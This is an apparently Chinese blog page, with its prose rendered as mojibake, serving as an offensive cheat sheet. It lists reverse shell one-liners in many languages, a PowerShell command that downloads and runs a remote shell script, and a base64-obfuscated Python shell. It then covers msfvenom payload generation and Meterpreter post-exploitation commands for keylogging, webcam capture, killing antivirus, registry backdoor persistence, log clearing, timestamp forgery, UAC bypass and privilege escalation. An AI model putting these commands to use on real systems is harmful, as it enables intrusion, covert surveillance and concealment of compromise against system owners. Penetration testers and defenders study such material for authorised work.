<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre>
<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre>
<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre>
<h2 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h2><pre><code>nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
</code></pre>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><pre><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre>
<h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
</code></pre>
<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
</code></pre>
<h2 id="åŠ å¯†shell"><a href="#åŠ å¯†shell" class="headerlink" title="åŠ å¯†shell"></a>åŠ å¯†shell</h2><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.100:2333 &gt; /tmp/s; rm /tmp/s
</code></pre>
<h1 id="msfå¤§å…¨"><a href="#msfå¤§å…¨" class="headerlink" title="msfå¤§å…¨"></a>msfå¤§å…¨</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/270456.html">https://www.freebuf.com/articles/web/270456.html</a></p>
<p><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/79.html">https://saucer-man.com/information_security/79.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235631">https://www.anquanke.com/post/id/235631</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å®‰è£…</p>
<pre><code class="bash"># å®‰è£…
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
å®‰è£…ç›®å½• 
# /opt/metasploit-framework/embedded/framework/
</code></pre>
<p>å®‰è£…2</p>
<pre><code>wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
chmod +x ./metasploit-latest-linux-x64-installer.run
./metasploit-latest-linux-x64-installer.run
</code></pre>
<p>payloadç”Ÿæˆ</p>
<p>Linux</p>
<pre><code class="bash">åå‘è¿æ¥ï¼š
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.9 LPORT=4444 -f raw &gt; revshell.bin
æ­£å‘è¿æ¥ï¼š
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; bind.elf
</code></pre>
<p>Windows</p>
<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.9 LPORT=4444 -f raw &gt; shell.bin

msfvenom -p windows/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=808 -f exe &gt; shell.exe
</code></pre>
<p>Mac</p>
<pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f macho &gt; shell.macho
</code></pre>
<p>PHP</p>
<pre><code class="bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.php
cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
</code></pre>
<p>ASP</p>
<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f asp &gt; shell.asp
</code></pre>
<p>JSP</p>
<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.jsp
</code></pre>
<p>WAR</p>
<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f war &gt; shell.war
</code></pre>
<p>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š</p>
<pre><code class="bash">php shell.php
</code></pre>
<p>3.è„šæœ¬shell</p>
<p>Python</p>
<pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.py
</code></pre>
<p>Bash</p>
<pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.sh
</code></pre>
<p>Perl</p>
<pre><code class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.pl
</code></pre>
<p>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p>
<pre><code>python -c &quot;exec(&#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#39;.decode(&#39;base64&#39;))&quot;
</code></pre>
<p>4.shellcode<br>Linux Based Shellcode</p>
<pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;
</code></pre>
<p>Windows Based Shellcode</p>
<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;
</code></pre>
<p>Mac Based Shellcode</p>
<pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;
</code></pre>
<h2 id="MeterpreteråŸºæœ¬å‘½ä»¤"><a href="#MeterpreteråŸºæœ¬å‘½ä»¤" class="headerlink" title="MeterpreteråŸºæœ¬å‘½ä»¤"></a>MeterpreteråŸºæœ¬å‘½ä»¤</h2><p>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š</p>
<pre><code class="bash">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
#set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set lPORT 6789
set ExitOnSession false
exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)
jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ 
kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ 
sessions -l  # (æŸ¥çœ‹ä¼šè¯)
sessions -i 2   # é€‰æ‹©ä¼šè¯
sessions -k 2   # ç»“æŸä¼šè¯
</code></pre>
<p>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚</p>
<p>è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚</p>
<h3 id="åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"><a href="#åŸºæœ¬ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><pre><code class="bash"># ä¼šè¯ç®¡ç†
background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°
sessions  # æŸ¥çœ‹ä¼šè¯
sessions -i  # åˆ‡æ¢ä¼šè¯
quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯

# ç³»ç»Ÿè®¾ç½®
sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯
idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´
reboot/shutdown   # é‡å¯/å…³æœº

# shell
shell  # è·å¾—æ§åˆ¶å°æƒé™
irb  # è¿›å…¥rubyç»ˆç«¯

# è¿›ç¨‹è¿ç§»
getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid
ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹
migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­
kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹
migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­

# æ‰§è¡Œæ–‡ä»¶
execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶
execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’

# æ‘„åƒå¤´å‘½ä»¤
webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨
webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£
webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§
webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘

# uictlå¼€å…³é”®ç›˜/é¼ æ ‡
uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡
uictl disable mouse  #ç¦ç”¨é¼ æ ‡
uictl disable keyboard  #ç¦ç”¨é”®ç›˜

# è¿œç¨‹æ¡Œé¢/æˆªå±
enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢
getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢
screenshot  #æˆªå±
use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab
run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥

# é”®ç›˜è®°å½•
keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•
keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®
keyscan_stop #ç»“æŸé”®ç›˜è®°å½•

# æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢
# å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤
run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662

# å…³é—­é˜²ç—…æ¯’è½¯ä»¶
run killav
run post/windows/manage/killav

# ä¿®æ”¹æ³¨å†Œè¡¨
reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #è®¾ç½®é”®å€¼
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼
nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨

# æ¸…ç†æ—¥å¿—
clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—
</code></pre>
<h3 id="æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"><a href="#æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><pre><code class="bash">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤
search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©
getwd/pwd  # è·å–å½“å‰ç›®å½•
getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•
upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶
download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶
edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶
mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹
rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹
lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•

# timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³
timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©
timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³
timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt
</code></pre>
<h3 id="ç½‘ç»œå‘½ä»¤"><a href="#ç½‘ç»œå‘½ä»¤" class="headerlink" title="ç½‘ç»œå‘½ä»¤"></a>ç½‘ç»œå‘½ä»¤</h3><pre><code class="bash"># åŸºæœ¬
ipconfig/ifconfig
netstat â€“ano
arp
getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯
route   #æŸ¥çœ‹è·¯ç”±

# portfwdç«¯å£è½¬å‘
portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç 


# æ·»åŠ è·¯ç”±

# æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰
run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©
run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ
run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±

# æ–¹å¼äºŒpost/multi/manage/autoroute
run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ
run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±
(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))

# ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œå­˜æ´»æ£€æµ‹
run arp_scanner -r 192.168.2.0/24
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0

# autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†
# msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚
# auxiliary/server/socks_proxy
# use auxiliary/server/socks_unc
# å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 1080
run

# ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080
# æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®

## msf ä»£ç†è®¾ç½®
set proxies socks5:127.0.0.1:30801

set ReverseAllowProxy true


# snifferæŠ“åŒ…
use sniffer
sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡
sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…
sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€
sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…
sniffer_stop 2   #åœæ­¢æŠ“åŒ…
</code></pre>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><pre><code class="bash"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š
# modules/post/windows/gather
# modules/post/linux/gather
# ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„
run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº
run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº
run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº
run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯
run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ
run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜
run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜
run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯
run post/windows/gather/enum_domain  #æŸ¥æ‰¾å®šä½åŸŸæ§
run post/windows/gather/enum_logged_on_users  #ç™»å½•è¿‡çš„ç”¨æˆ·
</code></pre>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚</p>
<pre><code class="bash">getsystem  
</code></pre>
<p>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚</p>
<p>msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š</p>
<pre><code class="bash">msf5 auxiliary(server/socks5) &gt; search bypassuac

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
</code></pre>
<p>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong></p>
<pre><code class="bash"># ç¤ºä¾‹
meterpreter &gt; getuid
Server username: SAUCERMAN\TideSec
meterpreter &gt; background
[*] Backgrounding session 4...
msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac
msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4
SESSION =&gt; 4
msf5 exploit(windows/local/bypassuac) &gt; run

[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (206403 bytes) to 192.168.81.154
[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700
[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.

# ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ
# ç„¶é¹…è¿™é‡Œå¤±è´¥äº†
</code></pre>
<p>3.å†…æ ¸æ¼æ´ææƒ</p>
<p>æ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚</p>
<pre><code class="bash">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯
msf5 &gt; use exploit/windows/local/ms13_053_schlamperei
msf5 &gt; set SESSION 2
msf5 &gt; exploit

# ç¤ºä¾‹
meterpreter &gt; run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
meterpreter &gt; background
[*] Backgrounding session 4...
msf5 exploit(windows/local/bypassuac) &gt; search MS13-081

Matching Modules
================

   #  Name                                             Disclosure Date  Rank     Check  Description
   -  ----                                             ---------------  ----     -----  -----------
   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page


msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu
msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4
session =&gt; 4
msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit

[!] SESSION may not be compatible with this module.
[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
# ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´
</code></pre>
